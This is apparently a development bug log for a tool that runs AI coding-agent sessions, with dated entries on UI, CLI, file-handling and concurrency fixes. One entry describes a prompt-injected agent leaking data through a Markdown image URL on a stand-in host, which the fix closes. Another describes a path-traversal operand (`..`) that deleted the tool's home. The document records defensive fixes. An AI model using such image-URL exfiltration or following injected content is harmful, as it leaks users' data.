**Verify.** `A_note_crosses_without_the_paths_and_the_account_it_names` in `SessionSyncTests` checks
that `(401)` and `daoris/s1` cross and that no path or profile does. It failed with the push
uncleaned.

## A send that did not arrive lost the paragraph, and a chat's end went unheard (2026-09-25)

**Symptom.** Found by REV3's reading. Three parts of one failure:
- The composer cleared its words and files as it sent, before the driver answered. When the answer
  was "that session has ended" (`sent: false`) or a refusal, what the person had written was gone.
- The frame kept one refusal for every session. Attending another session by a notification, the
  palette or a quest's door showed one session's "went nowhere" on another's composer.
- The driver emits `SESSION_ENDED` the moment a conversation's record moves, and no page code had ever
  subscribed to it. A chat whose harness exited read as working until the next tick, up to a poll
  later. That is exactly the window in which a message sent into it went nowhere.

**Root cause.** The composer treated a send as delivered once asked. The refusal was frame state with
no session attached. The event's emitter was written with the chats (SES2), and its consumer never
was.

**Fix.** A send that does not arrive hands its words back into that session's draft, ahead of anything
typed since, and names its files, since the page no longer holds their bytes. A refusal carries the
session it belongs to. `ShellSignals` refetches the sessions and the driver on `SESSION_ENDED`, without
a toast.

**Verify.**
- `hands the words back into the box, and names the files, when a send does not arrive` was watched
  failing without the fix.
- `a conversation's end refetches the sessions at once` failed on the missing handler.

## Drafts for an all-digit session were dropped as they were typed (2026-09-25)

**Symptom.** Found by REV3's reading, then shown by probe. Once 50 drafts were kept, typing into a
conversation whose session id was all digits lost each keystroke as it was made. Session ids are 8 hex
characters, so about one in fifty is all digits.

**Root cause.** Drafts were a map, and their age was the order of its keys. JavaScript orders
integer-like keys first, whatever order they were written in. So the draft being typed was always the
"oldest", and it was the one cut to keep the limit.

**Fix.** Drafts are an ordered list of `[session, words]` pairs, which is what age needs. A map written
by the earlier build is still read.

**Verify.** `keeps the draft being typed however its session id is spelled, through a reload too` fills
the limit, types into `12345678`, and does it again after a round-trip through storage.

## An agent's Markdown image made the page fetch a URL the agent chose (2026-09-25)

**Symptom.** Found by REV3's reading, then shown by probe. An agent's message containing
`![log](https://host.example/p.png?d=<anything it read>)` rendered as an `<img>`, and the desktop's
webview fetched it with no click. Whatever the agent put in that URL left the machine. It did so even
where the agent's own network tools were refused (D47 §4, D52), for example if the agent had been
prompt-injected by a repository's content.

**Root cause.** D76 §5 made the conversation "safe by default" by not parsing raw HTML, and the test
proved that raw `<img>` HTML stays text. A Markdown image is not raw HTML, though. The renderer's
default kept `https:` sources, and `Markdown.tsx` overrode links and code but not images.

**Fix.** An image renders as a link to what it names, labelled with its alt text. It opens outside the
window, and only when clicked.

**Verify.** `never loads an agent's Markdown image`: there is no `<img>` in the page, and the link
opens outside the window with the URL intact. The test failed on `<img alt="build log">` before the
fix.

## An answer that outlived the session it was for armed a destructive press on another (2026-09-25)

**Symptom.** Found by REV3's reading, then reproduced in a test. The person presses *discard the tree*
on session A, and while git runs, clicks session B. A's refusal then arrived and armed *discard it
anyway* on B's review, above A's warning. Pressing it force-discarded B's tree, uncommitted work
included, and nobody had looked at B's work. The code's own comment says this must not happen, and a
reset at render made it look handled. The same class existed on the decline form: a reason
half-written for one parked session was still typed in the next one's form, ready to decline it with
somebody else's reason.

**Root cause.** Both kept state per mounted component, and the component outlived the session. In
`DiffPane` the reset ran at render, but the answer came back in a promise whenever git finished and
wrote to whichever session was showing then. `AwaitingPerson` sat at the same place in the tree
across sessions, so React kept its state.

**Fix.** `DiffPane` records which session each act was asked about, and drops an answer for any other.
`AwaitingPerson` is keyed by the session's id.

**Verify.** Two tests, each watched failing first:
- `drops a discard answer that lands after the person moved to another session` holds the discard's
  answer, rerenders on another session, then resolves it. The failing run showed the button armed
  exactly as described.
- `starts each parked session's decline empty` types a reason, rerenders on another parked session,
  and checks the form.

## Tabbing through the strikes field told the driver never to park (2026-09-25)

**Symptom.** Found by REV3's reading. Clicking or tabbing into Settings → Driver → *Park a quest after
this many failed sessions* and leaving it without typing sent `SET_STRIKES { strikes: 0 }`. Zero means
never park, and the toast "This machine never parks a quest" read like a confirmation. Clearing the
box did the same. It is the one setting whose `why` records a quest spending an account eighteen times.

**Root cause.** `onBlur` ran `Number(strikes)` on the held text. Before any typing that text is `null`,
and after a clear it is `''`. Both convert to 0, which passes the integer check.

**Fix.** Nothing typed, a cleared box, or the value already held writes nothing and puts the held
value back.

**Verify.** `writes the strikes only when the person changed them`: focus and blur, a cleared box, and
retyping the same value send no `SET_STRIKES`, while a real change sends exactly one. It failed on the
first blur before the fix.

## Three CLI boundaries with no guard: `import`'s folder, `upstream`'s write, and the exit code (2026-09-25)

**Symptom.** Found by REV3's reading. (1) With `DAORIS_SERVICE_URL` pointing at a shared deployment,
`daoris import ../repos` sent the folder's absolute path there, along with the key. The server
refused it, but only after the path had left the machine. (2) `daoris upstream` wrote to wherever the
lock's `source` pointed, so a merge-mangled or crafted entry could land a rule body outside the
canon. (3) Any exception that was not a `DaorisError` escaped `runCli` as a stack trace with Node's
exit 1, which is the *policy* code. A build gate would read a failed file-system call as "the doctrine
is wrong".

**Root cause.** (1) `connect` sends its root only to a local service (`isLocalService`), but `import`
was written without the same guard. (2) D18's containment exists only in `applySync`, and `upstream`
writes in the other direction. (3) `report` rethrew anything it did not recognise.

**Fix.** (1) `import` refuses before sending when a folder is named and the service is not on this
machine. (2) `upstream` resolves the canon file and refuses unless it lies inside the canon.
(3) `report` writes one line and returns 2.

**Verify.** Three new tests, each watched failing before its fix:
- `import names no folder to a service that is not on this machine` asserts that nothing was sent.
- `a lock entry whose source leaves the canon is refused` asserts that nothing was written outside.
- `a failure nobody anticipated is a tool error (exit 2)` runs `check` over a `daoris.json` that is a
  directory.

## `sync` deleted a repository's own rule file, and rewrote its CRLF instruction files (2026-09-25)

**Symptom.** Found by REV3's reading, then shown by probe. Both defects came in with D59.
(1) Since D59 a repository may keep its own `.claude/rules/<name>.md` even when a canon rule has the
same name, and a test holds that. When the canon then retired that rule, or a pack switched it off,
the next plain `sync` deleted the repository's file. The output said only "retired 1". That broke
three promises: D19's row, the instruction-file design §5, and "`--force` is the only way to lose
work". (2) An adopter whose `AGENTS.md` or `CLAUDE.md` used CRLF or had a BOM saw every line of its
own text change on the first sync, even though `writeRegion` promises that everything outside the
region "survives byte for byte".

**Root cause.** (1) `applySync` removed a file for every retired lock entry. A retired span has no
file of Daoris's at its old path, because it leaves when the region is rewritten, so the only file
there is one the repository wrote. (2) `writeSpans` read the file through `readText`, which strips the
BOM and turns CRLF into LF before `writeRegion` sees the text. `writeRegion`'s own line-ending
detection therefore always answered LF. `region.test.ts` called `writeRegion` directly and passed.

**Fix.** The plan now names the deletes that were spans (`leavesRegion`), and `applySync` removes a
file only for the rest. That still covers a pre-D59 file and the migration's old file. `writeSpans`
and the pointer write now hand the writer the raw bytes, and every comparison still reads normalized
text.

**Verify.** Two new tests in `sync.test.ts`, both failing before the fix. `retiring a span never
deletes the repository's own file at the old path` failed with ENOENT on the file sync had deleted.
`an adopter's CRLF instruction files keep their line endings and BOM through a sync` checks that
there is no bare LF anywhere, that both prefixes survive, and that a second sync leaves identical
bytes.

## An edit over a home file the CLI could not read erased what it held (2026-09-25)

**Symptom.** Found by REV3's reading, then shown by probe. The CLI reads each of the home's JSON files
(`permissions.json`, `remotes.json`, `harnesses.json`, `keys.json`, `plugins.json`) as empty when it
cannot parse it. Its editors then wrote the edit back over that empty reading. One `agent rules allow`
over a `permissions.json` saved with a BOM erased every deny rule and every switched-off default. The
same pattern hit the other files: one `remote add` dropped every other workspace's remote, one
`agent key` erased the other accounts' keys, and one `plugin disable` switched back on every plugin
the person had turned off. Each printed success. A BOM alone was enough, and that is how Windows
PowerShell 5.1 saves UTF-8. The C# twins strip a BOM, so the driver was enforcing rules the CLI could
not see. `remote list` said "no remote" while the driver kept syncing. Separately, the remotes map was
a case-sensitive `Map` here and `OrdinalIgnoreCase` in both C# twins. So `remote remove aurora`
answered "not wired" over an `Aurora` the driver still fed.

**Root cause.** Eight readers each hand-rolled `JSON.parse(readFileSync(…))`, and none stripped a
BOM. They made four different choices about an unreadable file, and only `driver.json`'s editor
refused. Reading an unreadable file as empty is right for a session about to spawn. It is the wrong
starting point for an edit, and nothing separated the two uses.

**Fix.** `fsx.ts` now has one reader, `readJsonObject`. It strips the BOM, answers absent as null and
names what is unreadable. It also has one writer, `writeJsonAtomic`, which refuses while the file on
disk is one the reader could not read. Every editor writes through that writer, so the rule holds for
whichever editor comes next. `addKeyAccount` now keeps the key before it makes the account's
directory, so a refusal leaves nothing behind. `plugin add` names a broken manifest instead of
throwing past the dispatcher. The remotes map now matches workspace names the way its twins do, and
keeps whatever spelling the file already uses.

**Verify.** `homefiles.test.ts` covers each of the six files. For each one, a BOM reads, and an edit
over a torn file is refused with the file byte-for-byte unchanged. All six failed before the fix. The
remotes suite gains a case test in which `add aurora` over `Aurora` replaces the entry and
`remove AURORA` removes it.

## `daoris plugin remove ..` deleted the Daoris home (2026-09-25)

**Symptom.** Found by REV3's reading, never hit. `daoris plugin remove ..` answered "plugin `..`
removed" and had deleted the whole home: `driver.json`, `remotes.json` with its keys, every account,
`keys.json`. `remove .` deleted `plugins/` with every plugin's kept data inside it, which the verb
promises it never touches.

**Root cause.** `requireId` checked only that an id was present, and `remove` joined it under
`plugins/` and deleted recursively. Every installed id already has `ID_SHAPE` (the catalogue refuses
anything else), so the operand was the one place an arbitrary string became a path. The desktop's
Plugins card resolves its id through the catalogue first and never had the flaw.

**Fix.** `requireId` refuses an id that is not `ID_SHAPE` before any path is built, for `remove`,
`enable` and `disable` alike.

**Verify.** `an id that is not a plugin id is refused before it becomes a path`: `..`, `.`, `.data`,
`../x` and both slash forms, on all three verbs, with the home, the install and `.data` still there
after. Before the fix, `remove ..` deleted the fixture's home and the test failed on its first case.

## A message sent mid-turn on Claude Code's door sat inside the turn before it (2026-09-25)

**Symptom.** Found by reading CONV3b's code, never seen on the window. On the native door, a
message the person sent while Claude Code was still answering was written into the conversation's
record at once. So it sat between the running turn's words and that turn's ending, and the
conversation read as though the agent had been answering a question it had not yet been asked. The
protocol door already queued, so the two doors disagreed about the same conversation.

**Root cause.** `ChatRunner.Say` wrote a native message to the harness's stdin and appended it to the
record in one step, whatever the harness was doing. Claude Code takes such a line while a turn runs
and may fold it into that turn. The SDK declares this (`user_message_uuid`, `still_queued`); it is
bundle evidence and was not measured. Neither the stdin write nor the record waited for the turn's
`result`.

**Fix.** One turn queue for both doors (`ChatTurns`). A message waits until the turn's end is in the
record, then is recorded and sent. The capture tells the queue about the turn's end after appending
it, never before, so the next message cannot land ahead of that ending. The same queue carries the
new stop (CONV4a) and hands back what was waiting.

**Verify.** `A_message_sent_mid_turn_on_the_native_door_waits_for_the_turn_to_end`: a stand-in Claude
Code that writes down each line as it arrives hears `first`, its result, then `second`. With the old
immediate write it would hear `second` before `first`'s result. The record reads person, agent,
turn, twice. A real Claude Code chat on the scratch machine was then stopped mid-turn from the
terminal: the queued line came back unsent, and the next message was answered in the same session.

## A page reading a conversation could make it lose a word (2026-09-25)

**Symptom.** CONV3b's protocol-chat test passed alone and failed about one full driver run in
three. The record held both of the person's messages and both turn endings, but not the agent's
answer to the second: a turn had ended with its words missing.

**Root cause.** `SessionEvents.Read` used `File.ReadLines`, which opens the file denying writers,
and `Append` used `File.AppendAllText`, which does the same to readers. Reads take no lock: a page
reads history over `SESSION_HISTORY` whenever it opens a session or closes a gap, while the session
is appending. An append that met a read failed with a sharing violation, and its caller dropped the
event with one console line. The caller was right not to fail a session over its record (D76), but
the event was gone for good. The test polled the record every 50 ms, which is how it found this;
in the shell it would have been the page's own reads.

**Fix.** Both sides open the file sharing read and write, and a line torn by a concurrent write
costs itself (the reader already skipped one).

**Verify.** `Every_append_lands_while_the_record_is_being_read`: 150 appends against 150 concurrent
reads, all kept. It fails 3 runs of 3 with the reader put back to deny writers. It was first written
as an unbounded read loop, but opening the file thousands of times a second fed this machine's
real-time scanner, so it is bounded. Four full runs of the driver suite passed with the protocol
chat test in them.

## A chat on the protocol door could never hold a conversation (2026-09-25)

**Symptom.** Found by reading the code for CONV3b, before anyone had tried it on the window.
`claude-code-acp`, `codex-acp` and every plugin-declared ACP harness declare `Interactive`, and the
start drawer offers them for a chat. The chat would open, and nothing a person sent could ever be
answered.

**Root cause.** `ChatRunner` knew one door. It spawned every chat as a pipe: stdin open, no
`initialize`, no `session/new`, and `Say` wrote the person's line to stdin as raw text. On the
protocol door stdin is the JSON-RPC stream, so the agent received a line that was not a frame,
before any handshake. The driven path had spoken the protocol since ACP1, through `AcpSession`, but
only as one turn end to end (`RunAsync`), with nothing a conversation could hold open. Nothing
gated it: the family rehearsal's chat ran on the pipe stub, and the ACP stub was not interactive.

**Fix.** `AcpSession` gained a conversation surface (`OpenAsync`, `PromptAsync`, `CancelTurnAsync`,
`CloseAsync`), with `RunAsync` their composition. `ChatRunner` holds a `ProtocolChat` per protocol
conversation:
- one session, opened with the connector, the plugins' servers and the composed rules;
- a turn per message, one at a time, each recorded when it is sent;
- *finish* as the queued turns, then `session/close`, then the end of input.

The ACP stub became interactive, and the family rehearsal holds a conversation over the door.

**Verify.** Driver tests: a conversation is one session with a turn per prompt, a cancelled turn
keeps the session, and nothing is prompted before it opens. A protocol chat end to end against a
node agent that writes down any raw line: one handshake, two ordered turns (the second sent
mid-turn), `session/close`, then input ended, with the record in order. The family rehearsal adds
three checks (274/274). On the window, the ACP adapter held a real two-turn conversation on this
machine's Claude Code account. The look also found the session's own settings updates shown as
"an update this version does not know" rows, and the empty-state sentence guessed from emptiness.
Both are fixed (CONV3b in the archive).

## A chat open when the shell closed stayed `working` forever, and stop could not end it (2026-09-25)

**Symptom.** A chat was running on the scratch machine when the shell was closed to rebuild it. On
the next start its record said *working, running 12m*, but no process was behind it, and the
composer offered to send into nothing. The repository stayed *busy*, so a new chat there was
refused. Pressing *stop* changed nothing and said nothing.

**Root cause.** Three gaps, one per way a session can outlive its process.
- **The shutdown order.** `DriverLoop.Stop()` waited for the driven loop, where an in-flight driven
  session is recorded `stopped`. A chat runs in `ChatRunner`, beside the loop, not in it. The
  shutdown killed its process, and its best-effort `Conclude` lost the race with
  `HostSupervisor.Stop()`, which came right after. This shape predates CONV3.
- **The person's stop.** `STOP_SESSION` asked only this driver's registry, and read `false` as "it
  already finished, and its record says how". An orphan's record says it is running.
- **A crash**, a kill or a power cut, which no shutdown order reaches, and which nothing ever
  looked for.

The catch: *not held here* is not *dead*. A terminal's `daoris-driver` or chat door shares the home
and holds its own processes, so no driver could tell an orphan from someone else's live session.

**Fix.**
- **A marker.** Every tracked process leaves one under the home's `sessions/` (`<id>.pid`: its id
  and start time), removed when released. `AliveOnThisMachine` asks the registry, then the marker.
  The start time tells a crash's leftover from a reused pid, and a start time it cannot read counts
  as alive.
- **The shutdown.** `ChatRunner.StopAll` ends the chats it holds, as the driver's own act with the
  note *the application closed while this conversation ran*. It returns once each record is
  written (bounded at 10 s). The loop disposes the runner inside the scope of the client the chats
  conclude through (below).
- **The person's stop.** `STOP_SESSION` falls through to `Orphans.EndAsync(only: id)`, which ends
  this machine's `starting` or `working` record that nothing here runs.
- **The sweep.** `DriverWatch` runs `Orphans.EndAsync` once before its first tick, in both hosts,
  for `working` records only: a `starting` one may be mid-spawn in another driver. It says so in
  that tick's report.

A teammate's record (`origin/id`), a parked one, and one another driver here holds are never touched.

**The window found two more.** Each was invisible to the unit tests.
- **The shutdown still wrote nothing.** A chat open at close came back ended by the *sweep's* note,
  not the close's. The loop's `ServiceClient` is scoped to `RunAsync` (`using var service`), and
  `Stop()` cancelled the loop before stopping the chats. The client the chats conclude through was
  disposed first, and `Conclude` did not catch `ObjectDisposedException`. The order is now the
  language's own: `ChatRunner` is `IDisposable` (disposing it is `StopAll`) and `RunAsync` declares
  it with `using` *after* the client, so it is disposed *before* it. The terminal chat door does the
  same, and `Conclude` also catches a disposed client.
- **The notice was untrue.** Both stop doors ignored the answer and said *"the record will say the
  person ended it"*: for an orphan, whose record says nothing ran it, and for a session that had
  already finished. `STOP_SESSION` answers `{ stopped, orphan }`, and one `stopNotice` picks the
  sentence for both doors.

**Verify.** Six driver tests:
- a held process is alive to a second registry sharing the home until released;
- a dead process's marker is not life;
- the sweep ends only the right record;
- the person's stop ends one `starting` orphan;
- a runner disposed inside its client's scope ends its chat and records it;
- the loop's first tick ends a leftover and reports it.

The shutdown test failed with the wait removed, once the stand-in's record writes took 400 ms as a
host's do; before that it passed without the wait, because the stand-in answered faster than the
assertion ran. Three web tests cover the stop notice, one per answer (two were red first), and the
module test holds `orphan: false` with no service.

On the window:
- the rebuilt shell's first look ended the orphaned chat and a stub intake left `working` for 14
  hours;
- a chat open at close came back `stopped` with the close's note, its marker gone;
- stop on an orphan made after the sweep ended it with the orphan's note and freed its repository.

Driver 616 → 622, web unit 911 → 914.

## Every message was sent twice, and cancelling an API key saved it (2026-09-25)

**Symptom.** The first chat whose record kept what the person sent (CONV3a) showed each message
twice: two *you* blocks, recorded 4 ms apart. A sweep for the same shape then found the harness
roster's key form. Typing a key and pressing *never mind* closed the field **and saved the key**,
and a credential account appeared that the person had just declined.

**Root cause.** HTML makes an untyped `<button>` inside a `<form>` that form's submit, and `Button`
passed no type. The composer's send had `onClick={say}` and was also the form's submit. A click ran
`say`, then the form's submit ran `say` again with the same `draft`, because the update that clears
it had not rendered between the two. The key form's cancel was an untyped button beside a typed
save: pressing it submitted the form, and `addKey` ran with the typed key. Neither test could see
it. The composer's test asserted *called with*, never *called once*, and the key test pressed save
only. Nothing on the page showed the second send until the record kept what was sent.

**Fix.** `Button` defaults to `type="button"`, and a form's submit says `type="submit"`. The
composer's send is the form's submit with no click handler of its own, so a press takes one path. A
sweep of every form, reading multi-line tags, found no other untyped button, of either kind.

**Verify.** Three tests: an untyped `Button` in a form is a button, the composer sends once per
press, and cancelling a typed key sends no `key-add`. Each was red first, the composer's with *called
2 times*. Web unit 909 → 911. On the window, a chat sent one message by clicking send: one *you*,
one user event in the record, one turn.

## A chat just started showed "Nothing attended", and a code block widened the conversation (2026-09-25)

**Symptom.** Found on the first real Claude Code chat on the structured wire (CONV3a). Starting a
chat from the drawer showed *Nothing attended* beside it; the session was running, and pressing its
rail row brought it back. With the chat open, a fenced block with long lines pushed the whole
conversation wider than its measure. The block did not scroll inside its own box. And every tool
card read `Read D:\…\family\game\README.md`, truncated before the part a reader wanted.

**Root cause.** The frame clears a selection whose record is gone, and "gone" meant "absent from
the list's current answer". A session just started is attended *before* the list has caught up with
it. The first answer after the start still lacked it, so the frame cleared a selection it had only
just made. The width: the conversation is a grid, and a grid track's default minimum is its
content's width, so a `<pre>` with a long line set the track's minimum, not the scroll box.
The paths: Claude Code names what it touched by absolute path, and the adapter composes the title
from that path.

**Fix.** Only a record the frame has seen can be gone: a `seen` set of every id the list has
answered with, and a selection is cleared only when it was seen and is now absent. The
conversation and each turn are `grid-cols-[minmax(0,1fr)]` with `min-w-0`, so the track can shrink
and the block scrolls in place. A tool card's title, place and diff caption show a path inside the
session's tree relative to it (`inTree`, display only; the record keeps what the wire said).

**Verify.** Two frame tests: a just-started session stays attended while the list lacks it, and a
session the frame saw and that has gone is let go. Four `inTree` tests (separators and case, a
sibling that only shares the prefix, POSIX) and a view test. On the window: a chat started from the
drawer stayed attended; the fenced block scrolled inside its box; the card read `Read README.md`.

## Retiring the last repository left every retired one indexed (2026-09-24)

**Symptom.** The owner's install, every registration retired the day before, still served 1,052
entries from 17 repositories: charted on Overview, found by search, compared by convergence. Found
republishing the install after POLISH4, whose new Overview note ("the others are registered…") was
false there for the same reason.

**Root cause.** `KnowledgeIndex.RefreshAsync` removes a held repository the scan did not see only
when the scan saw SOMETHING — a guard written when the source was a folder, where seeing nothing
meant a mis-set path. Since WSP2 a local host reads the registered roots, so retiring the last
repository leaves a scan that sees nothing by construction, and the guard kept every retired
repository forever. `RetireAsync`'s own comment ("its entries leave on the next refresh by the
ghost rule") was true for every retire but the last. The guard could not simply go: a shared host
reads an empty source because it is FED, and there an empty scan says nothing about what it holds.

**Fix.** A local host (the one whose source is the registered roots, fed by nobody) passes the
registry to the refresh, and a held repository the registry no longer names leaves whatever the
scan saw. The guard still keeps a registered repository whose checkout cannot be read. A fed host
passes nothing and behaves as before.

**Verify.** Three service tests: the last retire empties the index; with nothing readable, a
registered repository keeps its entries and a retired one leaves; a fed host's refresh keeps what it
was fed. Service 470 → 473. On the republished install, pressing *rebuild index* took it from 17
repositories and 1,052 entries to none, and search to no answer. That empty index then showed
Overview's repositories card as a heading over a footnote about adopted dots; it has an empty state
now (web 867).

## Sentences that stopped being true, and four marks the window read wrongly (2026-09-24)

**Symptom.** Read with data in it (POLISH4: the scratch shell over the example family, which holds a
parked session, two intakes, five asks and an unadopted repository), the window said things that were
no longer so. Overview: the index "scans the family's folder" and only an adopter is addressable.
Projects: "who cannot be asked yet", and a real agent's use of the connector in an unadopted
repository "not yet proven". The band: finished work would join it "once review exists". The intake
room told its agent an unadopted repository was "Not addressable: nothing there can see a quest". And
four marks misread: a parked session ringed its repository *working now* on the map; every search
snippet of a canon-shaped entry opened `--- name: … applies_when: …`; the ask cards all read
*proposed* whatever their intake was doing; and 中文 said 任务 for a quest in nineteen strings.

**Root cause.** Each sentence was true when written and was never re-read when the decision under it
moved: WSP2 made the registry explicit, D70 made a registered repository with a root addressable,
PERM1 measured the connector working there, SURF6 built review without recording what was looked at.
**A claim in a catalogue has no test pointing at the code it describes**, so nothing failed. The
marks: the map's `LIVE` set counted `awaiting-person` as working; `Text.Excerpt` windowed the raw
body, frontmatter first; `AskCard` was never handed its intake's state, though the band beside it
read the same record; and the map, the chain strip, the monitor and the strikes setting were
translated after the glossary set 委托, by strings nobody compared.

**Fix.** Each sentence says what is true now (two artefacts' rule tables too, which explained
themselves with decision numbers a person cannot look up). The map marks a parked session apart, in
the warn tone, and its legend names the number in a node. The excerpt is taken from the prose, and
the frontmatter still matches. The card says *an intake is reading it* or *its intake asked you*.
`i18n.test.ts` now holds that a string about a quest never says 任务, as it holds 工作区 and 账户.
🔴 **One trap found on the way:** `max-w-prose` on a flex item caps its `basis-full`, so a note
given a measure stopped breaking to its own line and sat beside the slider; the measure goes on a
child of the full-basis item.

**Verify.** Tests on each side: CLI and driver (no decision number in a default's reason), the intake
room, the service (an excerpt never from the frontmatter), topology and the map view, the ask card
and record, Convergence, Projects, the catalogue. Looked at on the rebuilt window in both languages
and themes. CLI 446, driver 587, service 470, web 866 + 21 Playwright, family 271/271.

## Convergence took about seven seconds on the first real index (2026-09-24)

**Symptom.** On the owner's install (1,052 entries, lexical only) the Convergence view showed a bare
"comparing…" for 4.5–10.4 seconds a call. Search on the same host answered in 0.07s, so the store
was not the cost.

**Root cause.** The restatement pass compared every ORDERED pair of local entries, so each unordered
pair twice, although containment is symmetric: an earlier entry has already either claimed this one
or scored below the threshold. And it counted shared tokens by walking the first set, which could be
a tome's vocabulary while the second was a paragraph's. A fixture of three documents cannot show
either.

**Fix.** Walk each pair once (`j > i`) and the smaller set. A test pins the grouping a chain of
restatements makes (alpha≈beta, beta≈gamma, alpha≉gamma), which is where the order of comparison
could have mattered.

**Verify.** 2.1–2.5s a call on the same install. The answers at thresholds 0.5, 0.75 and 0.9 were
saved before the change and are byte-identical after it. Service 469/469.

## A new installation's Projects was a blank page, and both composers could never send (2026-09-24)

**Symptom.** On the owner's install, with every registration retired, Projects showed its header
over nothing. *Ask* opened a composer whose circle choice was empty, and *new quest* one whose *from*
and *to* were empty. Each let a person write a whole request that could never be sent.

**Root cause.** Nothing had ever rendered an empty registry. The example family always holds a
repository, so every story, unit test and Playwright run had something to list. The composers read
their choices from the registry and had no branch for none. **An empty machine is the first thing a
new installation shows, and the fixture structurally cannot show it.**

**Fix.** Projects has an empty state that says nothing is registered and offers *add repository* (or,
in a browser, how a repository joins). Each composer, knowing nobody can be asked, says so and offers
only *close*. The map's empty headline stopped saying "this circle" when scoped to every circle.

**Verify.** Four vitest cases, one per surface, each with an empty registry. Looked at on the
installed window in 中文 and English, light and dark.

## Fourteen catalogue strings and the service's sentences printed their backticks (2026-09-24)

**Symptom.** Settings read ``也可用 `daoris driver notify on|off`——``, with literal backticks, in
both languages. So did the plugins card, the rules card, Convergence's advice (the service's own
sentence), a harness's "`dsh` is not on this machine's PATH" (the driver's), and every toast naming a
quest.

**Root cause.** The catalogues and the service mark a command or a name the way a commit message does,
and nothing on the page read that markup. Each string was written by someone who meant code and
checked in a test that matched the raw text, so every check passed on the backticks themselves.

**Fix.** `Inline` in `ui.tsx`. It sets each backticked pair as `<code>`, leaves a lone backtick as
the character it is, and changes no word, so a service's sentence is still verbatim. `SettingRow`'s
hint, `Tip`, the toast and `EmptyState` take it on their own. The other sites opt in. Seven
Playwright assertions matched the backticks in toasts and now match the rendered sentence.

**Verify.** Three `ui.test.tsx` cases (a pair, several pairs and a lone one, a setting hint). 21/21
Playwright. Looked at on the window.

## Four default rules ran together as one block, and a failed session wore success's green (2026-09-24)

**Symptom.** On the rules card, `connector`, `commit`, `no-push` and `tree-guard` had no rule or space
between them. In the Sessions rail, every failed or stopped session had a green dot beside the word
失败.

**Root cause.** Two unrelated ones. Each default's `SettingRow` was the only child of its own `<li>`,
so its `first:border-t-0 first:pt-0` and `last:pb-0` all held at once. The row's separation assumes
siblings, and the list gave it none. And `DOT_TONE.ended` was `bg-st-done`. Ended covers completed,
failed, declined and stopped at once, so borrowing one outcome's hue painted the other three as it.

**Fix.** The item carries the rule and the padding, since the item is what has siblings. `ended` is
`bg-ink-faint`: nothing is happening, and the pill beside it names the outcome.

**Verify.** `AgentRules.test.tsx` holds the item's rule and padding. `ui.test.tsx` holds that ended
wears no `bg-st-` class. Looked at on the window.

## Chinese set in italic was slanted by synthesis (2026-09-24)

**Symptom.** Overview's footnote and every italic hint in 中文 were slanted ideographs.

**Root cause.** The Chinese system face has no italic, so the browser makes an oblique by shearing
it. That is a typesetting error, not emphasis.

**Fix.** `font-synthesis-style: none` on the body. The Latin face's real italic stays, and a face
without one stays upright.

**Verify.** `tokens.test.ts` holds the declaration. Looked at on the window: the footnote is upright
and the English timeline notes are still italic.

## The web gate failed a different typing test each run, at the 5-second default (2026-09-24)

**Symptom.** `npm run test:web` failed four full runs in a row, each on a different test (the asks
composer, search, the workspace switcher, the intake select, the rules form). Each failed at 5.1–6s
and passed alone. The first two runs had sibling builds competing for the CPU, but the next two did
not.

**Root cause.** No `testTimeout` was set, so every test had vitest's 5-second default. Tests that type
through `userEvent` wait on a timer per keystroke, and across ~60 jsdom files in parallel workers the
slowest crossed 5s on a machine also running other agent sessions. The suite had grown into its
timeout; nothing was hung.

**Fix.** `testTimeout: 20_000` in `vite.config.ts`, with the reason beside it: a timeout detects
hangs, not slowness. An assertion that fails still fails at once. The trap: **a timeout that fails a
different test each run is measuring the machine, not the code.** One data point would not justify
raising it (TEST1's rule). Four runs, each failing a different test that passes alone, do.

**Verify.** The next run: 810/810 and 21 Playwright.

## The first real ACP run died at its first tool call, reported as "the stream ended" (2026-09-24)

**Symptom.** ACP2's real driven run, once PERM1 let it past the trust hold, started three real
sessions. Each said "I'll start by taking the quest", then ended "exited without touching its quest".
The transcript said *the ACP agent's stream ended before it answered*, and the adapter said *ACP
connection closed*. The strike limit parked the quest after three.

**Root cause.** `Render` read an update's `content.text` for every update before looking at its
kind. A real `tool_call` carries `content` as a **list**, and `TryGetProperty` on a list throws. The
throw escaped `DispatchAsync`, ended `PumpAsync`, and its `finally` faulted every pending request
with "the stream ended". The driver then tore the session down, which is what the adapter saw as its
connection closing. The rehearsals' stub only ever sent flat updates.

**Fix.** `Text` reads `content` only when it is an object, and the update's kind is read safely in
`Render` and `Measure`. The pump now survives any frame it cannot read: it shows the frame and keeps
reading. The trap: **a `finally` that explains a failure must not be the only thing that sees it.**
Here it replaced the real exception with a plausible, wrong sentence.

**Verify.** `A_real_tool_call_whose_content_is_a_list_is_rendered_and_the_turn_goes_on` and
`An_update_this_client_cannot_read_is_shown_and_the_turn_goes_on` failed first. Then `node
tools/acp2-proof.mjs --drive` ran 17/17 on a real login.

## A line typed to a running intake landed in the protocol's own stream (2026-09-24)

**Symptom.** INT4g noticed that a running intake still offered a message box. Checked in the driver,
a line typed there was not merely lost. On the protocol door it was written into the stdin the driver
uses for the session's JSON-RPC frames, and the page was told `sent: true`.

**Root cause.** `SessionProcesses.Send` refused only a process with no input stream. That was the
whole guard while every driven session was pipe-door. ACP1 opened stdin for the protocol's frames,
so "no stream" stopped covering the case, and an intake (one turn) is tracked in the same registry as
conversations.

**Fix.** A session is tracked with whether it takes a person's line. An intake does not, so `Send`
and `CloseInput` refuse it before anything is written, and the bridge answers with the driver's
sentence. The screen gives a running intake no box. The trap: **an open stdin is not an
invitation.** On the protocol door it belongs to the protocol. A driven quest session on that door
had the same exposure, fixed the same way as INT4i. A real tick showed `Send` answering `true` there
before the fix (`DrivenSessionInputTests`).

**Verify.** `A_session_that_takes_no_input_is_never_written_into_even_with_its_stdin_open` (a real
process with stdin open hears nothing), `A_running_intake_takes_no_messages_and_says_where_the_answer_goes`
(a real tick), and the bridge's refusal for both verbs, each seen failing first.

## The intake control was missing while the intake was off: the bridge leaves a null out (2026-09-24)

**Symptom.** Looking at AGT6's Settings card on the real window, the search row was there and the
intake row was not. That was on the desktop, with the intake off, which is exactly the state a
person would switch it on from. Every gate was green.

**Root cause.** The page tells a shell older than the intake by the field's absence (`'intakeAdapter'
in driver`). The bridge leaves a null property out of what it sends, so a shell with the intake off
sent no field and read as older. Two test doubles hid it. The modules' `AnswerAsync` serializes
with camelCase and keeps nulls, so the module test saw a present null. The page's mock returned
`intakeAdapter: null`, a shape the real bridge never sends.

**Fix.** Off is `""` on the wire (the file keeps null), and the page reads `""` as Off. The page's
mock now speaks the wire's form. One test covers the off state reading as Off, and one covers an
older shell answering no field, which still gets no control.

